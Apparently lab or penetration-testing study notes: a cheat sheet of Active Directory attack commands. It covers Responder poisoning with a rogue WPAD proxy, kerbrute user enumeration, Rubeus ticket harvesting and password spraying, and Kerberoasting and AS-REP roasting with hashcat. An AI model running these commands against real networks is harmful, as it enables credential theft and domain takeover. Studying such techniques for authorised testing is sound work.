# responder
```console
$ cat /etc/responder/Responder.conf | grep SMB #if OFF change to ON
SMB = ON 
$ sudo responder -I tun0 -rdw -v
```
- r: switch enables netbios wredir suffix queries
- d: switch enables netbios domain suffix querie
- w: switch starts the wpad rogue proxy server
- v: verbose

# Attacking Kerberos
## kerbrute: user enum
```Console
$ ./kerbrute userenum --dc example.local -d example.local users.txt
```
https://github.com/GhostPack/Rubeus
## Harvesting Tickets
on victim machine
```powershell
$ ./Rubeus.exe harvest /interval:30 # harvest for TGTs every 30 seconds
```
## Brute-Forcing / Password-Spraying
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: ```echo <ip> example.local >> C:\Windows\System32\drivers\etc\hosts```
```powershell
$ ./Rubeus.exe brute /password:<password> /noticket # This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user 
```
# Kerberoasting
on kali, `hashcat -m 13100`
## Rubeus
on victim machine
```powershell
$ ./Rubeus.exe kerberoast
```
## Impacket
```console
$ sudo python3 GetUserSPNs.py example.local/username:password -dc-ip $IP -request
```
# AS-REP Roasting
on kali, `hashcat -m 18200`
## Rubeus
on victim machine
```powershell
$ ./Rubeus.exe asreproast
```